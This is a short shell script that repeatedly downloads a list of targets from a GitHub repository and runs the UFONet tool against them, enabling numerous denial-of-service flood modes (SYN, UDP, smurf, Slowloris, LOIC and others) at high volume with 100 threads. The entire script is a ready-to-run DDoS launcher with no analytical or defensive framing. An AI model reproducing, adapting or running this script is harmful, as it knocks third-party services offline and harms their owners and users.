#!/usr/bin/env sh
while true
do
    wget -O /app/targets.txt https://raw.githubusercontent.com/Anarhyst266/flood/master/targets.txt
    /app/ufonet -f /app/targets.txt -r "1" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000"
done
